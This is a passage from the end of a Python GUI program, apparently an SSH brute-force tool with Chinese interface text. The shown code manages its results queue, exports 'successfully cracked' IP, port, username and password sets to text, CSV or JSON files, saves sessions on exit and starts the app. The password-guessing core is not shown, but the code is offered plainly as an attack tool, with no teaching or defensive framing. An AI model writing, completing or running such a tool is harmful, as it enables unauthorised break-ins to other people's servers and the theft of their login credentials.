            if "empty" not in str(e).lower(): # Don't log queue empty errors
                print(f"Error processing queue: {e}") # Debug
        self.root.after(100, self._process_queue) # Reschedule

    def _save_results_to_file(self):
        if not self.successful_logins_for_saving:
            messagebox.showinfo("无结果", "没有成功破解的凭据可供保存。")
            return

        filepath = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=(("文本文件", "*.txt"), ("CSV 文件", "*.csv"), ("JSON 文件", "*.json"), ("所有文件", "*.*")),
            title="保存成功凭据"
        )
        if not filepath: return

        output_format = "txt" # Default
        if filepath.lower().endswith(".csv"): output_format = "csv"
        elif filepath.lower().endswith(".json"): output_format = "json"

        try:
            with open(filepath, "w", newline='', encoding='utf-8') as f_out:
                if output_format == 'csv':
                    writer = csv.DictWriter(f_out, fieldnames=["ip", "port", "user", "password"]) # Assuming 'data' has these keys
                    writer.writeheader()
                    # We stored full data dicts in successful_logins_for_saving, ensure keys match
                    cleaned_for_csv = [{"ip":d.get("ip"), "port":d.get("port"), "user":d.get("user"), "password":d.get("password")}
                                       for d in self.successful_logins_for_saving]
                    writer.writerows(cleaned_for_csv)
                elif output_format == 'json':
                    json.dump(self.successful_logins_for_saving, f_out, indent=2, ensure_ascii=False)
                else: # txt
                    for d in self.successful_logins_for_saving:
                        f_out.write(f"IP: {d.get('ip')}:{d.get('port')}, User: {d.get('user')}, Password: {d.get('password')}\n")
            self._log_message(f"成功凭据已保存到 {filepath}", "SUCCESS")
            messagebox.showinfo("保存成功", f"成功凭据已保存到 {filepath}")
        except Exception as e:
            self._log_message(f"保存输出文件失败: {e}", "ERROR")
            messagebox.showerror("保存失败", f"保存文件失败: {e}")

    def on_closing(self):
        if self.worker_thread and self.worker_thread.is_alive():
            if messagebox.askyesno("退出", "爆破任务仍在运行中。是否强制退出并尝试保存会话？"):
                self._log_message("用户请求退出，尝试停止并保存会话...", "WARNING")
                self.stop_event_global.set()
                # Give worker a moment to react, then save
                self.root.after(500, lambda: save_session(self.results_queue))
                self.root.after(1000, self.root.destroy) # Then destroy
            else:
                return # Do not close
        else: # Not running or finished
            save_session(self.results_queue) # Save session on normal close too
            self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    # Dependency check first
    try:
        check_and_install_dependencies_gui(root) # Pass root for GUI messages
    except SystemExit: # If check_and_install exits, don't proceed
         root.destroy() # Clean up the (potentially hidden) root window
         sys.exit(1) # Ensure script actually exits

    app = SSHBruteForceApp(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing) # Handle window close button
    root.mainloop()